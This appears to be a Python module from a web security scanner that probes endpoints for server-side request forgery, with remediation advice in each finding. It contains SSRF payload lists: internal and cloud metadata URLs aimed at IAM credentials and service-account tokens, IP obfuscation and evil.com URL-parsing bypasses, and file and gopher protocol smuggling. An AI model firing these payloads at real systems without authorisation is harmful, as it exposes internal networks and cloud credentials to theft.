"""SSRF (Server-Side Request Forgery) Scanner"""
import asyncio
from typing import Dict, List
from urllib.parse import quote
from rich.console import Console

from core.module import BaseModule, Finding
from core.http import AsyncClient

console = Console()


class SSRFScanner(BaseModule):
    """Test for Server-Side Request Forgery vulnerabilities"""

    name = "ssrf_scanner"
    description = "SSRF detection: internal network access, cloud metadata, protocol smuggling"

    # Internal targets
    INTERNAL_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254",  # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",  # GCP metadata
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ]

    # Bypass techniques
    BYPASS_PAYLOADS = [
        # IP obfuscation
        "http://2130706433",  # 127.0.0.1 as decimal
        "http://0x7f000001",  # 127.0.0.1 as hex
        "http://017700000001",  # 127.0.0.1 as octal
        "http://127.1",  # Short form
        "http://127.0.0.1.nip.io",  # DNS rebinding
        # URL tricks
        "http://127.0.0.1:80@evil.com",
        "http://evil.com#@127.0.0.1",
        "http://127.0.0.1%2523@evil.com",
        # Protocol smuggling
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    # Parameters commonly vulnerable to SSRF
    SSRF_PARAMS = [
        "url", "uri", "path", "src", "source", "href", "link",
        "redirect", "redirect_url", "callback", "next", "target",
        "dest", "destination", "domain", "host", "site",
        "feed", "rss", "val", "validate", "proxy",
        "image", "img", "load", "fetch", "file",
    ]

    async def execute(self, target: str, client: AsyncClient, config: Dict) -> List[Finding]:
        """Execute SSRF testing"""
        console.print("[bold cyan]SSRF Scanner[/bold cyan] - Testing server-side request forgery")

        endpoints = config.get("ssrf_endpoints", config.get("endpoints", []))

        # If no endpoints specified, test common patterns
        if not endpoints:
            endpoints = [
                "/api/fetch",
                "/api/proxy",
                "/api/preview",
                "/api/webhook",
                "/api/callback",
                "/api/image",
                "/api/url",
            ]

        # Stage 1: Test each endpoint with SSRF params
        await self._test_param_injection(target, client, endpoints)

        # Stage 2: Test with bypass techniques
        await self._test_bypasses(target, client, endpoints)

        # Stage 3: Cloud metadata access
        await self._test_cloud_metadata(target, client, endpoints)

        console.print(f"  [green]SSRF scan complete: {len(self.findings)} findings[/green]")
        return self.findings

    async def _test_param_injection(self, target: str, client: AsyncClient, endpoints: List[str]):
        """Test SSRF via parameter injection"""
        console.print("  [dim]Testing parameter injection[/dim]")

        for endpoint in endpoints:
            for param in self.SSRF_PARAMS:
                for ssrf_target in self.INTERNAL_TARGETS[:5]:  # Test top 5
                    resp = await client.get(
                        f"{target}{endpoint}",
                        params={param: ssrf_target},
                    )

                    if self._detect_ssrf(resp, ssrf_target):
                        self.add_finding(
                            severity="CRITICAL" if "169.254" in ssrf_target else "HIGH",
                            title=f"SSRF via {param} parameter: {endpoint}",
                            description=f"Server makes requests to attacker-controlled URLs",
                            url=f"{target}{endpoint}?{param}={quote(ssrf_target)}",
                            evidence=f"Parameter: {param}, Target: {ssrf_target}, Status: {resp['status']}",
                            impact="Internal network access, cloud metadata exposure, RCE via protocol smuggling",
                            remediation="Allowlist URLs, block internal IPs, disable unnecessary protocols",
                        )
                        return  # One finding per endpoint

    async def _test_bypasses(self, target: str, client: AsyncClient, endpoints: List[str]):
        """Test SSRF bypass techniques"""
        console.print("  [dim]Testing bypass techniques[/dim]")

        for endpoint in endpoints[:3]:  # Top 3 endpoints
            for payload in self.BYPASS_PAYLOADS:
                resp = await client.get(
                    f"{target}{endpoint}",
                    params={"url": payload},
                )

                if self._detect_ssrf(resp, payload):
                    self.add_finding(
                        severity="HIGH",
                        title=f"SSRF bypass: {endpoint}",
                        description=f"SSRF filter bypassed using obfuscation technique",
                        url=f"{target}{endpoint}?url={quote(payload)}",
                        evidence=f"Bypass payload: {payload}",
                        impact="Filter bypass allows internal network access",
                        remediation="Parse and validate resolved IP, not just URL string",
                    )
                    return

    async def _test_cloud_metadata(self, target: str, client: AsyncClient, endpoints: List[str]):
        """Test cloud metadata access (AWS/GCP/Azure)"""
        console.print("  [dim]Testing cloud metadata access[/dim]")

        metadata_urls = [
            ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ]

        for endpoint in endpoints[:3]:
            for cloud, meta_url in metadata_urls:
                resp = await client.get(
                    f"{target}{endpoint}",
                    params={"url": meta_url},
                )

                if resp["status"] == 200 and resp.get("body"):
                    body = str(resp["body"])
                    # Check for cloud metadata indicators
                    if any(indicator in body for indicator in [
                        "AccessKeyId", "SecretAccessKey",  # AWS
                        "access_token", "token_type",  # GCP
                        "subscriptionId", "resourceGroup",  # Azure
                    ]):
                        self.add_finding(
                            severity="CRITICAL",
                            title=f"Cloud metadata exposed via SSRF ({cloud})",
                            description=f"SSRF allows access to {cloud} instance metadata",
                            url=f"{target}{endpoint}?url={quote(meta_url)}",
                            evidence=f"Cloud: {cloud}, Metadata URL: {meta_url}",
                            impact="Full cloud account compromise via stolen credentials",
                            remediation="Block metadata IP (169.254.169.254) at network level, use IMDSv2",
                        )

    def _detect_ssrf(self, resp: Dict, target_url: str) -> bool:
        """Detect if SSRF was successful"""
        if resp["status"] == 0 or resp.get("error"):
            return False

        body = str(resp.get("body", ""))

        # Indicators of successful internal access
        indicators = [
            "root:", "/bin/bash",  # /etc/passwd
            "AccessKeyId", "SecretAccessKey",  # AWS
            "computeMetadata",  # GCP
            "Server: Apache", "Server: nginx",  # Internal servers
            "redis_version", "+OK",  # Redis
            "MongoDB",  # MongoDB
        ]

        if resp["status"] == 200 and any(ind in body for ind in indicators):
            return True

        # Response differs significantly from normal error
        if resp["status"] == 200 and len(body) > 100 and "not found" not in body.lower():
            return True

        return False
